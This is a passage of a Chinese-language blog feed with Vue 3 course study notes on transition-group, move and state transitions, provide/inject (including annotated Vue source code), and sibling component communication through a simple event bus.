    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="transition-group"><a href="#transition-group" class="headerlink" title="transition-group"></a>transition-group</h1><p>transition只能过渡单个节点，或多个但每次只渲染一个。不能同时渲染多个节点。</p>
<p>假设需要用v-for渲染一整个列表，这种场景就不能使用transition，需要使用transition-group。</p>
<p>transition-group组件的特点：</p>
<ul>
<li>默认不渲染一个包裹元素，但可以通过tag指定渲染一个包裹元素</li>
<li>过渡模式不可用，因为不再相互切换特有的元素</li>
<li>内部元素总是需要提供唯一的key值</li>
<li>CSS过渡的类将会应用到内部的元素重，而非这个组&#x2F;容器本身</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">    &lt;button @click=&quot;list.push(list.length+1)&quot;&gt;ADD&lt;/button&gt; &lt;button @click=&quot;list.pop&quot;&gt;POP&lt;/button&gt;</span><br><span class="line">    &lt;div class=&quot;wraps&quot;&gt;</span><br><span class="line">      &lt;!-- 为tag属性赋值，渲染时会为内容加上对应的标签包裹，不写就没有 --&gt;</span><br><span class="line">      &lt;!-- 自定义类名属性、生命周期都和transition一样 --&gt;</span><br><span class="line">      &lt;transition-group </span><br><span class="line">        enter-active-class=&quot;animate__animated animate__bounceIn&quot;</span><br><span class="line">        leave-active-class=&quot;animate__animated animate__hinge&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;item&quot; v-for=&quot;(item, index) in list&quot; :key=&quot;index&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/div&gt;</span><br><span class="line">      &lt;/transition-group&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; reactive &#125; from &quot;vue&quot;</span><br><span class="line">import &quot;animate.css&quot;</span><br><span class="line"></span><br><span class="line">const list = reactive&lt;number[]&gt;([</span><br><span class="line">  1, 2, 3, 4, 5, 6</span><br><span class="line">])</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">.wraps &#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  flex-wrap: wrap;</span><br><span class="line">  word-break: break-all;</span><br><span class="line">  border: 1px solid #ccc;</span><br><span class="line">  .item &#123;</span><br><span class="line">    margin: 10px;</span><br><span class="line">    font-size: 30px;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>如果给transition-grop加上tag值（例如<code>&lt;transition-group tag=&quot;section&quot;&gt;省略&lt;/transition-group&gt;</code>）：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305241147124.png" alt="加上了包裹元素section"></p>
<h1 id="列表的移动过渡"><a href="#列表的移动过渡" class="headerlink" title="列表的移动过渡"></a>列表的移动过渡</h1><p>除了进入和离开外，transition-group还可以使用v-move为定位的改变添加动画。</p>
<p>和transition的类名一样，可以使用name定义前缀，或使用move-class自定义使用的类名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;button @click=&quot;random&quot;&gt;random&lt;/button&gt;</span><br><span class="line">    &lt;transition-group move-class=&quot;move&quot; class=&quot;warps&quot; tag=&quot;div&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;item&quot; v-for=&quot;item in list&quot; :key=&quot;item.id&quot;&gt;&#123;&#123; item.number &#125;&#125;&lt;/div&gt;</span><br><span class="line">    &lt;/transition-group&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;</span><br><span class="line">import _ from &quot;lodash&quot;</span><br><span class="line"></span><br><span class="line">// 使用new Array(81)会生成81项都为empty的数组</span><br><span class="line">// 这种方式就会生成81项都是undefined的数组</span><br><span class="line">const list = ref(Array.apply(null,&#123;length:81&#125; as number[]).map((_,index)=&gt;&#123;</span><br><span class="line">  return &#123;</span><br><span class="line">    id:index,</span><br><span class="line">    number:(index%9)+1</span><br><span class="line">  &#125;</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">const random = ()=&gt; &#123;</span><br><span class="line">  list.value = _.shuffle(list.value)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">.warps &#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  flex-wrap: wrap;</span><br><span class="line">  width: calc(27px * 9);</span><br><span class="line">  .item &#123;</span><br><span class="line">    width: 25px;</span><br><span class="line">    height: 25px;</span><br><span class="line">    border: 1px solid #ccc;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: center;</span><br><span class="line">    align-items: center;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">.move &#123;</span><br><span class="line">  transition: all 0.5s ease;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h1 id="状态过渡"><a href="#状态过渡" class="headerlink" title="状态过渡"></a>状态过渡</h1><p>也可以给数字、SVG、背景颜色等添加过渡动画。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input v-model=&quot;num.current&quot; type=&quot;number&quot; step=&quot;20&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &#123;&#123; num.tweenedNumber.toFixed(0) &#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; reactive, watch &#125; from &quot;vue&quot;</span><br><span class="line">import gsap from &quot;gsap&quot;</span><br><span class="line"></span><br><span class="line">const num = reactive(&#123;</span><br><span class="line">  current:0,</span><br><span class="line">  tweenedNumber:0</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">watch(()=&gt; num.current, (newVal)=&gt; &#123;</span><br><span class="line">  gsap.to(num,&#123;</span><br><span class="line">    duration:1,</span><br><span class="line">    tweenedNumber:newVal</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>依赖注入Provide&amp;Inject</title>
    <url>/web/study/Vue/23.%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5Provide&amp;Inject.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Provide-x2F-Inject"><a href="#Provide-x2F-Inject" class="headerlink" title="Provide &#x2F; Inject"></a>Provide &#x2F; Inject</h1><p>需要从父组件向子组件传递数据时会使用props。但有一些深度嵌套的组件，而深层的子组件只需要父组件的部分内容，这种情况下如果仍将prop沿着组件逐层传递，可能会很麻烦。</p>
<p>在Vue中通过原型链实现的这一功能。</p>
<p>只要在根组件注册了Provide，下面的所有子组件都能读到Provide传来的值。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305241453754.png" alt="使用Provide和Inject让根组件传值给后代组件"></p>
<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h1&gt;App.vue（爷爷）&lt;/h1&gt;</span><br><span class="line">  &lt;label&gt;</span><br><span class="line">    &lt;input type=&quot;radio&quot; value=&quot;red&quot; name=&quot;color&quot; v-model=&quot;colorVal&quot;&gt;</span><br><span class="line">    红色</span><br><span class="line">  &lt;/label&gt;</span><br><span class="line">  &lt;label&gt;</span><br><span class="line">    &lt;input type=&quot;radio&quot; value=&quot;green&quot; name=&quot;color&quot; v-model=&quot;colorVal&quot;&gt;</span><br><span class="line">    绿色</span><br><span class="line">  &lt;/label&gt;</span><br><span class="line">  &lt;label&gt;</span><br><span class="line">    &lt;input type=&quot;radio&quot; value=&quot;blue&quot; name=&quot;color&quot; v-model=&quot;colorVal&quot;&gt;</span><br><span class="line">    蓝色</span><br><span class="line">  &lt;/label&gt;</span><br><span class="line">  &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;ProvideA&gt;&lt;/ProvideA&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, provide, readonly &#125; from &quot;vue&quot;</span><br><span class="line">import ProvideA from &#x27;@/components/ProvideA.vue&#x27;</span><br><span class="line">const colorVal = ref&lt;string&gt;(&quot;red&quot;)</span><br><span class="line">// 把颜色值注入爷爷组件</span><br><span class="line">// 参数1：注入名 参数2：变量</span><br><span class="line">// 如果不想让子组件修改注入值，使用readonly包裹变量</span><br><span class="line">// provide(&quot;color&quot;, colorVal)</span><br><span class="line">provide(&quot;color&quot;, readonly(colorVal))</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">.box &#123;</span><br><span class="line">  height: 50px;</span><br><span class="line">  width: 50px;</span><br><span class="line">  border: 1px solid #ccc;</span><br><span class="line">  background-color: v-bind(colorVal);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>ProvideA.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;ProvideA.vue（父亲）&lt;/h1&gt;</span><br><span class="line">    &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;ProvideB&gt;&lt;/ProvideB&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, inject &#125; from &#x27;vue&#x27;</span><br><span class="line">import type &#123; Ref &#125; from &#x27;vue&#x27;</span><br><span class="line">import ProvideB from &#x27;./ProvideB.vue&#x27;</span><br><span class="line">// 父亲组件获取爷爷组件注入的值</span><br><span class="line">// 参数1：注入名 参数2：默认值</span><br><span class="line">const color = inject&lt;Ref&lt;string&gt;&gt;(&quot;color&quot;, ref(&quot;red&quot;))</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.box &#123;</span><br><span class="line">  height: 50px;</span><br><span class="line">  width: 50px;</span><br><span class="line">  border: 1px solid #ccc;</span><br><span class="line">  // 在Vue3中，样式里可以使用v-bind绑定setup中的变量</span><br><span class="line">  background-color: v-bind(color);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>ProvideB.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;ProvideB.vue（孙子）&lt;/h1&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;!-- provide传的值可以被子组件修改 --&gt;</span><br><span class="line">      &lt;button @click=&quot;change&quot;&gt;修改provide的值&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, inject &#125; from &#x27;vue&#x27;</span><br><span class="line">import type &#123; Ref &#125; from &#x27;vue&#x27;</span><br><span class="line">// 孙子组件获取爷爷组件注入的值</span><br><span class="line">const color = inject&lt;Ref&lt;string&gt;&gt;(&quot;color&quot;)</span><br><span class="line"></span><br><span class="line">const change = ()=&gt; &#123;</span><br><span class="line">  // 不指定默认值时，color的类型：Ref&lt;string&gt; | undefined</span><br><span class="line">  // 非空断言</span><br><span class="line">  color!.value = &quot;yellow&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.box &#123;</span><br><span class="line">  height: 50px;</span><br><span class="line">  width: 50px;</span><br><span class="line">  border: 1px solid #ccc;</span><br><span class="line">  background-color: v-bind(color);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>在Vue源码（<code>/package/runtime-core/src/apiInject.ts</code>）中可以看到provide和inject的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// provide</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> provide&lt;T, K = <span class="title class_">InjectionKey</span>&lt;T&gt; | <span class="built_in">string</span> | <span class="built_in">number</span>&gt;(</span><br><span class="line">  <span class="attr">key</span>: K,</span><br><span class="line">  <span class="attr">value</span>: K <span class="keyword">extends</span> <span class="title class_">InjectionKey</span>&lt;infer V&gt; ? V : T</span><br><span class="line">) &#123;</span><br><span class="line">  <span class="comment">// 读取当前组件的实例（currentInstance）并做判断</span></span><br><span class="line">  <span class="keyword">if</span> (!currentInstance) &#123;</span><br><span class="line">    <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">      <span class="comment">// 函数形式的provide只能在setup函数/语法糖模式使用，Options API无法使用</span></span><br><span class="line">      <span class="title function_">warn</span>(<span class="string">`provide() can only be used inside setup().`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 读取当前组件实例中的provides</span></span><br><span class="line">    <span class="keyword">let</span> provides = currentInstance.<span class="property">provides</span></span><br><span class="line">    <span class="comment">// by default an instance inherits its parent&#x27;s provides object</span></span><br><span class="line">    <span class="comment">// but when it needs to provide values of its own, it creates its</span></span><br><span class="line">    <span class="comment">// own provides object using parent provides object as prototype.</span></span><br><span class="line">    <span class="comment">// this way in `inject` we can simply look up injections from direct</span></span><br><span class="line">    <span class="comment">// parent and let the prototype chain do the work.</span></span><br><span class="line">    <span class="comment">// 默认情况下，实例继承父类的provides对象</span></span><br><span class="line">    <span class="comment">// 如果当前组件有自己的provide，它使用父provides对象作为原型创建自己的provides对象</span></span><br><span class="line">    <span class="comment">// 在inject中，只需查询原型链即可</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 当前组件的父组件的provides</span></span><br><span class="line">    <span class="keyword">const</span> parentProvides =</span><br><span class="line">      currentInstance.<span class="property">parent</span> &amp;&amp; currentInstance.<span class="property">parent</span>.<span class="property">provides</span></span><br><span class="line">    <span class="comment">// 判断父组件和子组件的provides是否一样</span></span><br><span class="line">    <span class="keyword">if</span> (parentProvides === provides) &#123;</span><br><span class="line">      <span class="comment">// 如果一样的话（子组件还没有自己的provide），以父组件的provides为基础创建新对象</span></span><br><span class="line">      provides = currentInstance.<span class="property">provides</span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(parentProvides)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TS doesn&#x27;t allow symbol as index type</span></span><br><span class="line">    <span class="comment">// 在新的对象上添加这次provide的值</span></span><br><span class="line">    provides[key <span class="keyword">as</span> <span class="built_in">string</span>] = value</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inject</span></span><br><span class="line"><span class="comment">// 一些函数重载</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> inject&lt;T&gt;(<span class="attr">key</span>: <span class="title class_">InjectionKey</span>&lt;T&gt; | <span class="built_in">string</span>): T | <span class="literal">undefined</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> inject&lt;T&gt;(</span><br><span class="line">  <span class="attr">key</span>: <span class="title class_">InjectionKey</span>&lt;T&gt; | <span class="built_in">string</span>,</span><br><span class="line">  <span class="attr">defaultValue</span>: T,</span><br><span class="line">  treatDefaultAsFactory?: <span class="literal">false</span></span><br><span class="line">): T</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> inject&lt;T&gt;(</span><br><span class="line">  <span class="attr">key</span>: <span class="title class_">InjectionKey</span>&lt;T&gt; | <span class="built_in">string</span>,</span><br><span class="line">  <span class="attr">defaultValue</span>: T | (<span class="function">() =&gt;</span> T),</span><br><span class="line">  <span class="attr">treatDefaultAsFactory</span>: <span class="literal">true</span></span><br><span class="line">): T</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">inject</span>(<span class="params"></span></span><br><span class="line"><span class="params">  key: InjectionKey&lt;<span class="built_in">any</span>&gt; | <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  defaultValue?: <span class="built_in">unknown</span>,</span></span><br><span class="line"><span class="params">  treatDefaultAsFactory = <span class="literal">false</span></span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// fallback to `currentRenderingInstance` so that this can be called in</span></span><br><span class="line">  <span class="comment">// a functional component</span></span><br><span class="line">  <span class="comment">// 读取当前组件实例</span></span><br><span class="line">  <span class="keyword">const</span> instance = currentInstance || currentRenderingInstance</span><br><span class="line"></span><br><span class="line">  <span class="comment">// also support looking up from app-level provides w/ `app.runWithContext()`</span></span><br><span class="line">  <span class="comment">// 如果能读到</span></span><br><span class="line">  <span class="keyword">if</span> (instance || currentApp) &#123;</span><br><span class="line">    <span class="comment">// #2400</span></span><br><span class="line">    <span class="comment">// to support `app.use` plugins,</span></span><br><span class="line">    <span class="comment">// fallback to appContext&#x27;s `provides` if the instance is at root</span></span><br><span class="line">    <span class="comment">// 尝试去读父组件的provides，如果实例在根目录，回退到appContext的provides中</span></span><br><span class="line">    <span class="keyword">const</span> provides = instance</span><br><span class="line">      ? instance.<span class="property">parent</span> == <span class="literal">null</span></span><br><span class="line">        ? instance.<span class="property">vnode</span>.<span class="property">appContext</span> &amp;&amp; instance.<span class="property">vnode</span>.<span class="property">appContext</span>.<span class="property">provides</span></span><br><span class="line">        : instance.<span class="property">parent</span>.<span class="property">provides</span></span><br><span class="line">      : currentApp!.<span class="property">_context</span>.<span class="property">provides</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (provides &amp;&amp; (key <span class="keyword">as</span> <span class="built_in">string</span> | <span class="built_in">symbol</span>) <span class="keyword">in</span> provides) &#123;</span><br><span class="line">      <span class="comment">// TS doesn&#x27;t allow symbol as index type</span></span><br><span class="line">      <span class="comment">// 读到就直接返回</span></span><br><span class="line">      <span class="keyword">return</span> provides[key <span class="keyword">as</span> <span class="built_in">string</span>]</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> treatDefaultAsFactory &amp;&amp; <span class="title function_">isFunction</span>(defaultValue)</span><br><span class="line">        ? defaultValue.<span class="title function_">call</span>(instance &amp;&amp; instance.<span class="property">proxy</span>)</span><br><span class="line">        : defaultValue</span><br><span class="line">    <span class="comment">// 读不到就报错</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">      <span class="title function_">warn</span>(<span class="string">`injection &quot;<span class="subst">$&#123;<span class="built_in">String</span>(key)&#125;</span>&quot; not found.`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">    <span class="title function_">warn</span>(<span class="string">`inject() can only be used inside setup() or functional components.`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>兄弟组件传参和Event Bus</title>
    <url>/web/study/Vue/24.%E5%85%84%E5%BC%9F%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%8F%82%E5%92%8CEvent%20Bus.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="借助父组件传参"><a href="#借助父组件传参" class="headerlink" title="借助父组件传参"></a>借助父组件传参</h1><p>交替使用emit和prop，以父组件为桥梁进行兄弟间的传参。</p>
<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- 这两个子组件是平级的 --&gt;</span><br><span class="line">    &lt;A @on-click=&quot;getFlag&quot;&gt;&lt;/A&gt;</span><br><span class="line">    &lt;B :flag=&quot;flag&quot;&gt;&lt;/B&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;</span><br><span class="line">import A from &quot;@/components/A.vue&quot;</span><br><span class="line">import B from &quot;@/components/B.vue&quot;</span><br><span class="line"></span><br><span class="line">let flag = ref(false)</span><br><span class="line">// 父组件将接收到的A组件的传值传给B组件</span><br><span class="line">const getFlag = (param: boolean)=&gt; &#123;</span><br><span class="line">  flag.value = param</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>A.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;a&quot;&gt;</span><br><span class="line">    &lt;h1&gt;A组件&lt;/h1&gt;</span><br><span class="line">    &lt;button @click=&quot;emitB&quot;&gt;派发一个事件&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">const emit = defineEmits([&quot;on-click&quot;])</span><br><span class="line">let flag = false</span><br><span class="line">// 通过自定义事件给父组件App.vue传递数据</span><br><span class="line">const emitB = ()=&gt; &#123;</span><br><span class="line">  flag = !flag</span><br><span class="line">  emit(&quot;on-click&quot;, flag)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.a &#123;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  background-color: cyan;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>B.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;b&quot;&gt;</span><br><span class="line">    &lt;h1&gt;B组件&lt;/h1&gt;</span><br><span class="line">    &#123;&#123; flag &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">defineProps&lt;&#123;</span><br><span class="line">  flag: boolean</span><br><span class="line">&#125;&gt;()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.b &#123;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  background-color: orange;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>但是这样太麻烦了，每次都要在父组件这里处理逻辑。</p>
<h1 id="借助Event-Bus传参"><a href="#借助Event-Bus传参" class="headerlink" title="借助Event Bus传参"></a>借助Event Bus传参</h1><p>简单实现一个发布者-订阅者模式。</p>
<p>bus.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">BusClass</span> = &#123;</span><br><span class="line">  <span class="comment">// emit的其他参数会传给on的callback函数</span></span><br><span class="line">  <span class="attr">emit</span>:<span class="function">(<span class="params">name:<span class="built_in">string</span></span>)=&gt;</span><span class="built_in">void</span></span><br><span class="line">  <span class="attr">on</span>:<span class="function">(<span class="params">name:<span class="built_in">string</span>,callback:<span class="built_in">Function</span></span>)=&gt;</span><span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">ParamsKey</span> = <span class="built_in">string</span> | <span class="built_in">number</span> | <span class="built_in">symbol</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">List</span> = &#123;</span><br><span class="line">  [<span class="attr">key</span>:<span class="title class_">ParamsKey</span>]:<span class="title class_">Array</span>&lt;<span class="title class_">Function</span>&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bus</span> <span class="keyword">implements</span> <span class="title class_">BusClass</span> &#123;</span><br><span class="line">  <span class="comment">// 调度中心</span></span><br><span class="line">  <span class="attr">list</span>:<span class="title class_">List</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">list</span> = &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">emit</span>(<span class="params">name:<span class="built_in">string</span>,...args:<span class="built_in">Array</span>&lt;<span class="built_in">any</span>&gt;</span>) &#123;</span><br><span class="line">    <span class="comment">// 取得回调函数集合</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">eventName</span>: <span class="title class_">Array</span>&lt;<span class="title class_">Function</span>&gt; = <span class="variable language_">this</span>.<span class="property">list</span>[name]</span><br><span class="line">    eventName.<span class="title function_">forEach</span>(<span class="function"><span class="params">fn</span>=&gt;</span> &#123;</span><br><span class="line">      fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>,args)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">on</span>(<span class="params">name:<span class="built_in">string</span>,callback:<span class="built_in">Function</span></span>) &#123;</span><br><span class="line">    <span class="comment">// 获取事件注册的回调函数数组，如果没有数组就新建一个</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">fn</span>:<span class="title class_">Array</span>&lt;<span class="title class_">Function</span>&gt; = <span class="variable language_">this</span>.<span class="property">list</span>[name] || []</span><br><span class="line">    fn.<span class="title function_">push</span>(callback)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">list</span>[name] = fn</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Bus</span>()</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;A&gt;&lt;/A&gt;</span><br><span class="line">    &lt;B&gt;&lt;/B&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import A from &quot;@/components/A.vue&quot;</span><br><span class="line">import B from &quot;@/components/B.vue&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>A.vue：</p>
